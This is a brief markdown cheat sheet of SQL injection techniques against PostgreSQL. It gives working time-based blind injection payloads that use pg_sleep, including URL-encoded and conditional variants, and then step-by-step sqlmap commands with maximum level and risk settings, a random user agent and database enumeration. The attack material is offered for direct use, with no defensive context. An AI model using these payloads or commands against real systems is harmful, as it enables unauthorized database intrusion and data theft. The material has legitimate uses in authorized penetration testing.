# SQL Injection

### PostgreSQL Time-Based Blind SQL Injection Payload
    12';select pg_sleep(30) --
    ';SELECT pg_sleep(10);--'
    '%3BSELECT+pg_sleep(10)%3B--'

### PostgreSQL Time-Based Blind SQL Injection Using Conditional pg_sleep()
    ' AND 2912=(SELECT 2912 FROM PG_SLEEP(5)) AND 'nmmcon' LIKE 'nmmcon

### How to perform testing using sql map 
  Step 1: We need to copy the request with the body in a file
  
  Step 2: Place the * to the parameter where we want to perform the SQL scan
  
  Step 3: Save the file 
  
  Step 4: Open the SQLmap and run below commands for the SQL file (Example: sqlil.txt / sql.txt) which is saved
  
  Step 5: Execute the below command in SQLmap
  
        sqlmap -r sqli1.txt --dbs --force-ssl --batch --level 5 --risk 3 --random-agent --technique ST --no-cast --threads 10 --time-sec 5
        
        sqlmap -r  sql.txt  --force-ssl --level=5  --risk=3  --dbms=PostgreSQL --batch --dbs --threads=10"
